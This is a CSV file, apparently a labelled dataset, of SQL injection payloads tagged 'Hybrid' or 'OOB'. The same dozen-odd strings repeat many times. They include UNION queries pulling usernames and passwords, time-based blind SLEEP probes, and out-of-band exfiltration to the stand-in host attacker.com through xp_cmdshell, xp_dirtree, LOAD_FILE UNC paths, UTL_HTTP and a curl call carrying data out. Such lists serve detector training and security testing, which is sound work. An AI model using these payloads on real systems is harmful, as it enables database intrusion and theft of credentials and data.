Payload,Tipo
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
'; exec master..xp_dirtree '\\attacker.com\share'--,OOB
"' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",OOB
' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,OOB
"' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
"' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",OOB
'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,OOB
"' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",OOB
"' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,OOB
' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,OOB
'; EXEC('xp_cmdshell ''ping attacker.com''')--,OOB
'; exec master..xp_fileexist '\\attacker.com\test'--,OOB
' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",OOB
'; exec master..xp_dirtree '\\attacker.com\share'--,OOB
"' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",OOB
' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,OOB
"' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
"' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",OOB
'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,OOB
"' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",OOB
"' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,OOB
' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,OOB
'; EXEC('xp_cmdshell ''ping attacker.com''')--,OOB
'; exec master..xp_fileexist '\\attacker.com\test'--,OOB
' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",OOB
'; exec master..xp_dirtree '\\attacker.com\share'--,OOB
"' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",OOB
' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,OOB
"' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
"' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",OOB
'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,OOB
"' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",OOB
"' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,OOB
' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,OOB
'; EXEC('xp_cmdshell ''ping attacker.com''')--,OOB
'; exec master..xp_fileexist '\\attacker.com\test'--,OOB
' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",OOB
'; exec master..xp_dirtree '\\attacker.com\share'--,OOB
"' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",OOB
' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,OOB
"' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
"' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",OOB
'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,OOB
"' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",OOB
"' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,OOB
' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,OOB
'; EXEC('xp_cmdshell ''ping attacker.com''')--,OOB
'; exec master..xp_fileexist '\\attacker.com\test'--,OOB
' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",OOB
'; exec master..xp_dirtree '\\attacker.com\share'--,OOB
"' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",OOB
' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,OOB
"' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
"' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",OOB
'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,OOB
"' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",OOB
"' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,OOB
' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,OOB
'; EXEC('xp_cmdshell ''ping attacker.com''')--,OOB
'; exec master..xp_fileexist '\\attacker.com\test'--,OOB
' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",OOB
'; exec master..xp_dirtree '\\attacker.com\share'--,OOB
"' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",OOB
' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,OOB
"' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
"' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",OOB
'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,OOB
"' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",OOB
"' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,OOB
' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,OOB
'; EXEC('xp_cmdshell ''ping attacker.com''')--,OOB
'; exec master..xp_fileexist '\\attacker.com\test'--,OOB
' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",OOB
'; exec master..xp_dirtree '\\attacker.com\share'--,OOB
"' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",OOB
' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,OOB
"' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
"' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",OOB
'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,OOB
"' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",OOB
"' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,OOB
' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,OOB
'; EXEC('xp_cmdshell ''ping attacker.com''')--,OOB
'; exec master..xp_fileexist '\\attacker.com\test'--,OOB
' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",OOB
'; exec master..xp_dirtree '\\attacker.com\share'--,OOB
"' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",OOB
' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,OOB
"' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
"' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",OOB
'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,OOB
"' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",OOB
"' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,OOB
' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,OOB
'; EXEC('xp_cmdshell ''ping attacker.com''')--,OOB
'; exec master..xp_fileexist '\\attacker.com\test'--,OOB
' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",OOB
'; exec master..xp_dirtree '\\attacker.com\share'--,OOB
"' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",OOB
' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,OOB
"' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
"' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",OOB
'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,OOB
"' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",OOB
"' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,OOB
' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,OOB
'; EXEC('xp_cmdshell ''ping attacker.com''')--,OOB
'; exec master..xp_fileexist '\\attacker.com\test'--,OOB
' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",OOB
'; exec master..xp_dirtree '\\attacker.com\share'--,OOB
"' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",OOB
' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,OOB
"' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
"' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",OOB
'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,OOB
"' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",OOB
"' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,OOB
' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,OOB
'; EXEC('xp_cmdshell ''ping attacker.com''')--,OOB
'; exec master..xp_fileexist '\\attacker.com\test'--,OOB
' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",OOB
'; exec master..xp_dirtree '\\attacker.com\share'--,OOB
"' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",OOB
' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,OOB
"' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
"' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",OOB
'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,OOB
"' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",OOB
"' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,OOB
' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,OOB
'; EXEC('xp_cmdshell ''ping attacker.com''')--,OOB
'; exec master..xp_fileexist '\\attacker.com\test'--,OOB
' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",OOB
'; exec master..xp_dirtree '\\attacker.com\share'--,OOB
"' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",OOB
' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,OOB
"' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
"' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",OOB
'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,OOB
"' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",OOB
"' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",OOB
' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,OOB
' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,OOB
'; EXEC('xp_cmdshell ''ping attacker.com''')--,OOB
'; exec master..xp_fileexist '\\attacker.com\test'--,OOB
' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,OOB
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",OOB
